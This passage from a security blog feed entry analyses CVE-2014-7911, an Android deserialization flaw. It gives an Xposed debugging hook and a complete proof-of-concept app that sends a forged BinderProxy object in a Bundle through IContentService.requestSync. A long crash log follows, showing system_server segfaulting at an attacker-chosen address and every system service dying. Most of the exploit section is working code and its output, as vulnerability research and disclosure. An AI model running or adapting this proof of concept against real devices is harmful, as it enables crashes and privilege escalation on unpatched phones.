03-02 14:37:00.360 31139-31154/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.ClassCastException: android.os.BinderProxy cannot be cast to java.io.Serializable
    at android.os.Parcel.readSerializable(Parcel.java:2142)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:367)
    at dalvik.system.NativeStart.run(Native Method)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This exception is just a ClassCastException, which means android.os.BinderProxy has been created, it just can&amp;rsquo;t be casted to java.io.Serializable.&lt;/p&gt;

&lt;h3 id=&#34;debugging:acd576735d79af9c00f02f7cf3030262&#34;&gt;Debugging&lt;/h3&gt;

&lt;p&gt;Set a breakpoint in our simulated system-server at this line:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/breakpoint.png&#34; alt=&#34;breakpoint screenshot&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Attach debugger to the process and follow the steps analyzed before, we can track the exucetion to &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/readserializable.png&#34; alt=&#34;breakpoint readSerializable()&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ois.readObject()&lt;/code&gt; suppose to create a android.os.BinderProxy object with its &lt;code&gt;mOrgue&lt;/code&gt; and &lt;code&gt;mObject&lt;/code&gt; set to &lt;code&gt;0x1337beef&lt;/code&gt;, but because of the exception &lt;code&gt;ClassCastException&lt;/code&gt;, tracking will break and debugger will stop there, so that we can&amp;rsquo;t see the result. In order to track the result of &lt;code&gt;ois.readObject()&lt;/code&gt;, I use Xposed to hook &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class HookParcel implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        findAndHookMethod(
                &amp;quot;android.os.Parcel&amp;quot;,
                loadPackageParam.classLoader,
                &amp;quot;readSerializable&amp;quot;,
                new XC_MethodHook() {
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        Parcel parcel = (Parcel) param.thisObject;
                        String name = parcel.readString();
                        if (name == null) {
                            param.setResult(null);
                        } else {
                            byte[] serializedData = parcel.createByteArray();
                            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                            ObjectInputStream ois = new ObjectInputStream(bais);
                            Object obj = ois.readObject();
                            XposedBridge.log(name);
                            if (name.equals(&amp;quot;AAdroid.os.BinderProxy&amp;quot;)) {
                                XposedBridge.log(obj.getClass().getName());
                                if (obj.getClass().getName().equals(&amp;quot;android.os.BinderProxy&amp;quot;)) {
                                    Class clz = obj.getClass();
                                    Field mOrgue = clz.getDeclaredField(&amp;quot;mOrgue&amp;quot;);
                                    Field mObject = clz.getDeclaredField(&amp;quot;mObject&amp;quot;);
                                    mObject.setAccessible(true);
                                    mOrgue.setAccessible(true);
                                    int v_mObject = mObject.getInt(obj);
                                    int v_mOrgue = mOrgue.getInt(obj);
                                    XposedBridge.log(&amp;quot;mObject:&amp;quot; + v_mObject);
                                    XposedBridge.log(&amp;quot;mOrgue:&amp;quot; + v_mOrgue);
                                }
                            }
                            param.setResult((Serializable) obj);
                        }
                    }
                }

        );
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hook does the same things as the original method, except printing some information we are interested in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/xposedlog.png&#34; alt=&#34;xposed log&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;write-a-poc-for-android-4-1:acd576735d79af9c00f02f7cf3030262&#34;&gt;Write A POC for Android 4.1&lt;/h2&gt;

&lt;p&gt;It was until 4.2 that Android added UserManager. But all the phones I get with Android OS version 4.2 and above are patched. The only one that hasn&amp;rsquo;t been patched, its OS version is 4.1, which dosen&amp;rsquo;t have UserManagerService. So I have to find the other system-servers which are exploitable. Here are some properties that an exploitable system-server should have:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It has functions receive Bundle type parameters.&lt;/li&gt;
&lt;li&gt;The Bundle parameters must perform &lt;code&gt;Bundle.getXXX()&lt;/code&gt; or &lt;code&gt;Bundle.get()&lt;/code&gt; in order to trigger &lt;code&gt;Bundle.unparcel()&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here I find manually find out the &lt;code&gt;android.content.IContentService&lt;/code&gt; is what I want. It has a method named &lt;code&gt;requestSync()&lt;/code&gt;, the definition in &lt;code&gt;IContentService.aidl&lt;/code&gt; is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void requestSync(in Account account, String authority, in Bundle extras);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;com.android.server.content.ContentService&lt;/code&gt; extends &lt;code&gt;IContentService.Stub&lt;/code&gt; and implements its methods. &lt;code&gt;android.content.ContentResolver&lt;/code&gt; can get a proxy of the server through a static method &lt;code&gt;ContentResolver.getContentService&lt;/code&gt;. So the POC on Android 4.1 are like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Bundle bundle = new Bundle();
    bundle.putSerializable(&amp;quot;eathis&amp;quot;, new AAdroid.os.BinderProxy());
    bundle.putBoolean(ContentResolver.SYNC_EXTRAS_UPLOAD, false);

    try {
        Class clIContentService = Class.forName(&amp;quot;android.content.IContentService&amp;quot;);
        Class[] csSubClasses = clIContentService.getDeclaredClasses();
        for (Class c: csSubClasses) {
            if (c.getCanonicalName().equals(&amp;quot;android.content.IContentService.Stub&amp;quot;)) {
                clStub = c;
            }
        }
        Field fTRANSACTION_requestSync =
                clStub.getDeclaredField(&amp;quot;TRANSACTION_requestSync&amp;quot;);
        fTRANSACTION_requestSync.setAccessible(true);
        TRANSACTION_requestSync = fTRANSACTION_requestSync.getInt(null);

        ContentResolver resolver = getContentResolver();
        Method mGetContentService = ContentResolver.class.getDeclaredMethod(&amp;quot;getContentService&amp;quot;);
        objProxy = mGetContentService.invoke(resolver);

        Class[] stubSubClasses = clStub.getDeclaredClasses();
        for (Class c: stubSubClasses) {
            if (c.getCanonicalName().equals(&amp;quot;android.content.IContentService.Stub.Proxy&amp;quot;)) {
                clProxy = c;
            }
        }
        Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
        fRemote.setAccessible(true);
        mRemote = (IBinder) fRemote.get(objProxy);

        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = accountManager.getAccounts();
        requestSync(accounts[0], &amp;quot;test&amp;quot;, bundle);

    } catch (Exception e) {
            e.printStackTrace();
    }
}

public void requestSync(Account account, String authority, Bundle extras) throws  android.os.RemoteException {
    android.os.Parcel _data = android.os.Parcel.obtain();
    android.os.Parcel _reply = android.os.Parcel.obtain();
    try {
        _data.writeInterfaceToken(DESCRIPTOR);
        _data.writeInt(1);
        account.writeToParcel(_data, 0);
        _data.writeString(authority);
        _data.writeInt(1);
        extras.writeToParcel(_data, 0);

        byte[] data = _data.marshall();
        for (int i=0; true; i++) {
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) {
                data[i] = &#39;a&#39;;
                data[i+1] = &#39;n&#39;;
                break;
            }
        }
        _data.recycle();
        _data = Parcel.obtain();
        _data.unmarshall(data, 0, data.length);
        mRemote.transact(TRANSACTION_requestSync, _data, _reply, 0);
        _reply.readException();
    } finally {
        _reply.recycle();
        _data.recycle();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run this application, then do some thing else to trigger GC, the phone is reboot! Logcat records this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;D/dalvikvm(  366): WAIT_FOR_CONCURRENT_GC blocked 0ms
I/FramebufferNativeWindow(14753):
D/v_gralloc(14753): fb_post info:change to format argb8888
E/dalvikvm(  343): GC_CONCURRENT freed 1966K, 73% free 938K/3395K, paused 11ms+18ms, total 39ms
E/dalvikvm(  366): GC_EXPLICIT freed 5972K, 19% free 38023K/46535K, paused 3ms+13ms, total 110ms
F/libc    (  366): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code=1), thread 374 (FinalizerDaemon)
D/libEGL  ( 2684): loaded /system/lib/egl/libEGL_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv1_CM_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv2_VIVANTE.so
I/DEBUG   (  130): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  130): Build fingerprint: &#39;Huawei/D2-0082/hwD2-0082:4.1.2/HuaweiD2-0082/C00B015:user/ota-rel-keys,release-keys&#39;
I/DEBUG   (  130): pid: 366, tid: 374, name: FinalizerDaemon  &amp;gt;&amp;gt;&amp;gt; system_server &amp;lt;&amp;lt;&amp;lt;
I/DEBUG   (  130): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3
D/OpenGLRenderer( 2684): Enabling debug mode 0
E/dalvikvm(  636): GC_CONCURRENT freed 2539K, 20% free 19968K/24711K, paused 2ms+4ms, total 48ms
D/dalvikvm(  636): WAIT_FOR_CONCURRENT_GC blocked 41ms
I/DEBUG   (  130):     r0 1337beef  r1 401d60f9  r2 50e2a908  r3 5713afe4
I/DEBUG   (  130):     r4 402248ec  r5 1337beef  r6 f2100001  r7 407811a5
I/DEBUG   (  130):     r8 1337beef  r9 1337beef  sl 50e2a918  fp 5cf2ac94
I/DEBUG   (  130):     ip 40222d7c  sp 5cf2ac50  lr 401d5cf3  pc 400d8e44  cpsr 20000030
I/DEBUG   (  130):     d0  0000000100060101  d1  6d782e74012a5c44
I/DEBUG   (  130):     d2  617369646f6e5f61  d3  6f6c6f685f656c65
I/DEBUG   (  130):     d4  1f1f1f1f1f1f1f1f  d5  1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d6  014a0ff01f1f1f1f  d7  0000005a4ee91870
I/DEBUG   (  130):     d8  0000000000000000  d9  0000000000000000
I/DEBUG   (  130):     d10 0000000000000000  d11 0000000000000000
I/DEBUG   (  130):     d12 0000000000000000  d13 0000000000000000
I/DEBUG   (  130):     d14 0000000000000000  d15 0000000000000000
I/DEBUG   (  130):     d16 0000000300000002  d17 0000000000000000
I/DEBUG   (  130):     d18 0000000000000000  d19 0000000000000000
I/DEBUG   (  130):     d20 1f1f1f1f1f1f1f1f  d21 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d22 1f1f1f1f1f1f1f1f  d23 9999999999999999
I/DEBUG   (  130):     d24 1f1f1f1f1f1f1f1f  d25 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d26 1f1f1f1f1f1f1f1f  d27 9999999999999999
I/DEBUG   (  130):     d28 0100010001000100  d29 0100010001000100
I/DEBUG   (  130):     d30 9999999999999999  d31 9999999999999999
I/DEBUG   (  130):     scr 20000010
I/DEBUG   (  130): 
I/DEBUG   (  130): backtrace:
I/DEBUG   (  130):     #00  pc 0000ee44  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)
I/DEBUG   (  130):     #01  pc 00065cef  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #02  pc 0001df30  /system/lib/libdvm.so (dvmPlatformInvoke+112)
I/DEBUG   (  130):     #03  pc 0004d183  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+394)
I/DEBUG   (  130):     #04  pc 00027360  /system/lib/libdvm.so
I/DEBUG   (  130):     #05  pc 0002bc68  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+180)
I/DEBUG   (  130):     #06  pc 0005f8f5  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+272)
I/DEBUG   (  130):     #07  pc 0005f91f  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)
I/DEBUG   (  130):     #08  pc 000544d3  /system/lib/libdvm.so
I/DEBUG   (  130):     #09  pc 00012e00  /system/lib/libc.so (__thread_entry+48)
I/DEBUG   (  130):     #10  pc 00012558  /system/lib/libc.so (pthread_create+172)
I/DEBUG   (  130): 
I/DEBUG   (  130): stack:
I/DEBUG   (  130):          5cf2ac10  f2000001  
I/DEBUG   (  130):          5cf2ac14  f2000001  
I/DEBUG   (  130):          5cf2ac18  5cf2ac44  
I/DEBUG   (  130):          5cf2ac1c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac20  40cca768  
I/DEBUG   (  130):          5cf2ac24  f2100001  
I/DEBUG   (  130):          5cf2ac28  5cf2ac44  
I/DEBUG   (  130):          5cf2ac2c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac30  40cca768  
I/DEBUG   (  130):          5cf2ac34  4077efa9  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac38  f2100001  
I/DEBUG   (  130):          5cf2ac3c  407811dd  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac40  40cca768  
I/DEBUG   (  130):          5cf2ac44  50e2a908  
I/DEBUG   (  130):          5cf2ac48  df0027ad  
I/DEBUG   (  130):          5cf2ac4c  00000000  
I/DEBUG   (  130):     #00  5cf2ac50  402248ec  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):          5cf2ac54  40cca768  
I/DEBUG   (  130):          5cf2ac58  f2100001  
I/DEBUG   (  130):          5cf2ac5c  401d5cf3  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #01  5cf2ac60  5831a278  /data/dalvik-cache/system@framework@core.jar@classes.dex
I/DEBUG   (  130):          5cf2ac64  5713b048  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac68  50e2a908  
I/DEBUG   (  130):          5cf2ac6c  00000000  
I/DEBUG   (  130):          5cf2ac70  57090f70  
I/DEBUG   (  130):          5cf2ac74  5cf2ac80  
I/DEBUG   (  130):          5cf2ac78  57090f68  
I/DEBUG   (  130):          5cf2ac7c  40753f34  /system/lib/libdvm.so (dvmPlatformInvoke+116)
I/DEBUG   (  130):     #02  5cf2ac80  57090f64  
I/DEBUG   (  130):          5cf2ac84  00000001  
I/DEBUG   (  130):          5cf2ac88  42a4e838  /dev/ashmem/dalvik-heap (deleted)
I/DEBUG   (  130):          5cf2ac8c  00000000  
I/DEBUG   (  130):          5cf2ac90  00000000  
I/DEBUG   (  130):          5cf2ac94  40783187  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r0:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r1:
I/DEBUG   (  130):     401d60d8 604060e0 0010f104 608968e1 f7d32100  .`@`.....h.`.!..
I/DEBUG   (  130):     401d60e8 4620eba0 bf00bd10 0004b6c4 0004c702  .. F............
I/DEBUG   (  130):     401d60f8 43f0e92d 68084604 460eb085 28004605  -..C.F.h...F.F.(
I/DEBUG   (  130):     401d6108 80a5f000 49546802 44796a13 b1104798  .....hTI.jyD.G..
I/DEBUG   (  130):     401d6118 69056830 4851e09b 44784f51 ece2f7d3  0h.i..QHQOxD....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r2:
I/DEBUG   (  130):     50e2a8e8 00000000 0000001b 00680043 00690072  ........C.h.r.i.
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..&#39;Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r3:
I/DEBUG   (  130):     5713afc4 00000004 40dfdab8 0000003c 40dfdff8  .......@&amp;lt;......@
I/DEBUG   (  130):     5713afd4 58ee622a 58df4f87 00000012 00000008  *b.X.O.X........
I/DEBUG   (  130):     5713afe4 40dfdff8 58ee0b14 58da66bf 00000002  ...@...X.f.X....
I/DEBUG   (  130):     5713aff4 0000000c 40dfdff8 58edfe02 58da66bf  .......@...X.f.X
I/DEBUG   (  130):     5713b004 00000002 00000010 000000ac 40dfdff8  ...............@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r4:
I/DEBUG   (  130):     402248cc 5713ad88 1d2000de 5713a4b8 5713a3f8  ...W.. ....W...W
I/DEBUG   (  130):     402248dc 00000001 570e46b0 00000107 1d2000ea  .....F.W...... .
I/DEBUG   (  130):     402248ec 1d2000ee 5713b010 5713b080 5713aff8  .. ....W...W...W
I/DEBUG   (  130):     402248fc 5713afd0 5713afe4 1d2000f6 5713b448  ...W...W.. .H..W
I/DEBUG   (  130):     4022490c 00000000 5712e128 1d2000b2 1d2000b6  ....(..W.. ... .
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r5:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r7:
I/DEBUG   (  130):     40781184 693b0f40 18c2d005 46204629 e824f7dd  @.;i....)F F..$.
I/DEBUG   (  130):     40781194 18c0e002 4500e9c0 f7fda801 bdfefefd  .......E........
I/DEBUG   (  130):     407811a4 4606b5f7 a801460c 46154631 f7fd461f  ...F.F..1F.F.F..
I/DEBUG   (  130):     407811b4 9801fecf f7fe4621 68ebfec7 0f40f013  ....!F.....h..@.
I/DEBUG   (  130):     407811c4 bf08692b d00450c7 8f5ef3bf f3bf50c7  +i...P....^..P..
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r8:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r9:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sl:
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..&#39;Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130):     50e2a938 00000000 00000000 56545670 5708d300  ........pVTV...W
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near fp:
I/DEBUG   (  130):     5cf2ac74 5cf2ac80 57090f68 40753f34 57090f64  ...\h..W4?u@d..W
I/DEBUG   (  130):     5cf2ac84 00000001 42a4e838 00000000 00000000  ....8..B........
I/DEBUG   (  130):     5cf2ac94 40783187 57090f64 58e4e177 401d5ca9  .1x@d..Ww..X.\.@
I/DEBUG   (  130):     5cf2aca4 50e2a918 00000000 00000000 5b8fafc8  ...P...........[
I/DEBUG   (  130):     5cf2acb4 4014fa70 00000001 50e2a908 ffffbfff  p..@.......P....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near ip:
I/DEBUG   (  130):     40222d5c 40450a35 40450a91 40155370 402deca0  5.E@..E@pS.@..-@
I/DEBUG   (  130):     40222d6c 404509d1 404508a5 400ac8d9 4042bdf5  ..E@..E@...@..B@
I/DEBUG   (  130):     40222d7c 400d8e41 40450869 40450795 404507f9  A..@i.E@..E@..E@
I/DEBUG   (  130):     40222d8c 4045175d 40451a4d 40450715 4011625c  ].E@M.E@..E@\b.@
I/DEBUG   (  130):     40222d9c 40139135 400d8d8f 4024578d 4024d549  5..@...@.W$@I.$@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sp:
I/DEBUG   (  130):     5cf2ac30 40cca768 4077efa9 f2100001 407811dd  h..@..w@......x@
I/DEBUG   (  130):     5cf2ac40 40cca768 50e2a908 df0027ad 00000000  h..@...P.&#39;......
I/DEBUG   (  130):     5cf2ac50 402248ec 40cca768 f2100001 401d5cf3  .H&amp;quot;@h..@.....\.@
I/DEBUG   (  130):     5cf2ac60 5831a278 5713b048 50e2a908 00000000  x.1XH..W...P....
I/DEBUG   (  130):     5cf2ac70 57090f70 5cf2ac80 57090f68 40753f34  p..W...\h..W4?u@
I/DEBUG   (  130): 
I/DEBUG   (  130): code around pc:
I/DEBUG   (  130):     400d8e24 680168a0 4629694a 68e34790 d50407da  .h.hJi)F.G.h....
I/DEBUG   (  130):     400d8e34 b11068a0 68536802 bd384798 4605b570  .h...hSh.G8.p..F
I/DEBUG   (  130):     400d8e44 460e6844 f7fd4620 2801eb3e 68a0d10b  Dh.F F..&amp;gt;..(...h
I/DEBUG   (  130):     400d8e54 68ca6801 47904631 07d868e3 6828d403  .h.h1F.G.h....(h
I/DEBUG   (  130):     400d8e64 46286843 46204798 e8bd4631 f7ff4070  Ch(F.G F1F..p@..
I/DEBUG   (  130): 
I/DEBUG   (  130): code around lr:
I/DEBUG   (  130):     401d5cd0 468168e2 47b84628 69626829 46282300  .h.F(F.G)hbi.#(F
I/DEBUG   (  130):     401d5ce0 71b4f8d1 47b84631 4648490a f7d34479  ...q1F.G.IHFyD..
I/DEBUG   (  130):     401d5cf0 f8d8ee92 46313000 0c0cf853 f7d34440  .....01FS...@D..
I/DEBUG   (  130):     401d5d00 f7d5ee8a e8bdea10 f02443f8 bf00bed7  .........C$.....
I/DEBUG   (  130):     401d5d10 0004ec36 00000409 4605b538 447b4b0f  6.......8..F.K{D
I/DEBUG   (  130): 
I/DEBUG   (  130): memory map around fault addr 1337bef3:
I/DEBUG   (  130):     (no map below)
I/DEBUG   (  130):     (no map for address)
I/DEBUG   (  130):     40000000-40002000 /system/lib/libsystem_server.so
E/dalvikvm(  553): GC_FOR_ALLOC freed 1895K, 17% free 20590K/24711K, paused 3ms+4ms, total 33ms
E/dalvikvm(  343): GC_CONCURRENT freed 1909K, 72% free 960K/3395K, paused 11ms+19ms, total 41ms
I/ServiceManager(  125): service &#39;network_management&#39; died
W/AudioFlinger(32595): power manager service died !!!
I/ServiceManager(  125): service &#39;backup&#39; died
I/ServiceManager(  125): service &#39;permission&#39; died
I/ServiceManager(  125): service &#39;hardware&#39; died
I/ServiceManager(  125): service &#39;netstats&#39; died
I/ServiceManager(  125): service &#39;sensorservice&#39; died
I/ServiceManager(  125): service &#39;content&#39; died
I/ServiceManager(  125): service &#39;mount&#39; died
I/ServiceManager(  125): service &#39;account&#39; died
I/ServiceManager(  125): service &#39;alarm&#39; died
I/ServiceManager(  125): service &#39;scheduling_policy&#39; died
I/ServiceManager(  125): service &#39;cpuinfo&#39; died
I/ServiceManager(  125): service &#39;power&#39; died
I/ServiceManager(  125): service &#39;clipboard&#39; died
I/ServiceManager(  125): service &#39;textservices&#39; died
I/ServiceManager(  125): service &#39;commontime_management&#39; died
I/ServiceManager(  125): service &#39;input_method&#39; died
I/ServiceManager(  125): service &#39;device_policy&#39; died
I/ServiceManager(  125): service &#39;accessibility&#39; died
I/ServiceManager(  125): service &#39;statusbar&#39; died
I/ServiceManager(  125): service &#39;window&#39; died
I/ServiceManager(  125): service &#39;input&#39; died
I/ServiceManager(  125): service &#39;battery&#39; died
I/ServiceManager(  125): service &#39;RfTestService&#39; died
I/ServiceManager(  125): service &#39;bluetooth_gattclient&#39; died
I/ServiceManager(  125): service &#39;vibrator&#39; died
I/ServiceManager(  125): service &#39;batteryinfo&#39; died
I/ServiceManager(  125): service &#39;bluetooth_a2dp&#39; died
I/ServiceManager(  125): service &#39;bluetooth&#39; died
I/ServiceManager(  125): service &#39;bluetooth_gattserver&#39; died
I/ServiceManager(  125): service &#39;lock_settings&#39; died
I/ServiceManager(  125): service &#39;usagestats&#39; died
I/ServiceManager(  125): service &#39;netpolicy&#39; died
I/ServiceManager(  125): service &#39;wifip2p&#39; died
I/ServiceManager(  125): service &#39;wifi&#39; died
I/ServiceManager(  125): service &#39;connectivity&#39; died
W/Sensors (  553): sensorservice died [0x5b6ab978]
I/ServiceManager(  125): service &#39;servicediscovery&#39; died
I/ServiceManager(  125): service &#39;throttle&#39; died
I/ServiceManager(  125): service &#39;updatelock&#39; died
I/ServiceManager(  125): service &#39;entropy&#39; died
I/ServiceManager(  125): service &#39;notification&#39; died
I/ServiceManager(  125): service &#39;hdmi&#39; died
I/ServiceManager(  125): service &#39;devicestoragemonitor&#39; died
I/ServiceManager(  125): service &#39;location&#39; died
I/ServiceManager(  125): service &#39;country_detector&#39; died
I/ServiceManager(  125): service &#39;search&#39; died
I/ServiceManager(  125): service &#39;dropbox&#39; died
I/ServiceManager(  125): service &#39;wallpaper&#39; died
I/ServiceManager(  125): service &#39;diskstats&#39; died
I/ServiceManager(  125): service &#39;audio&#39; died
I/ServiceManager(  125): service &#39;samplingprofiler&#39; died
I/ServiceManager(  125): service &#39;usb&#39; died
I/ServiceManager(  125): service &#39;serial&#39; died
I/ServiceManager(  125): service &#39;appwidget&#39; died
I/ServiceManager(  125): service &#39;uimode&#39; died
I/ServiceManager(  125): service &#39;ku.pService.dr&#39; died
I/ServiceManager(  125): service &#39;package&#39; died
I/ServiceManager(  125): service &#39;activity&#39; died
I/ServiceManager(  125): service &#39;meminfo&#39; died
I/ServiceManager(  125): service &#39;gfxinfo&#39; died
I/ServiceManager(  125): service &#39;dbinfo&#39; died
I/ServiceManager(  125): service &#39;telephony.registry&#39; died
D/AndroidRuntime( 2684): Shutting down VM
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;references:acd576735d79af9c00f02f7cf3030262&#34;&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>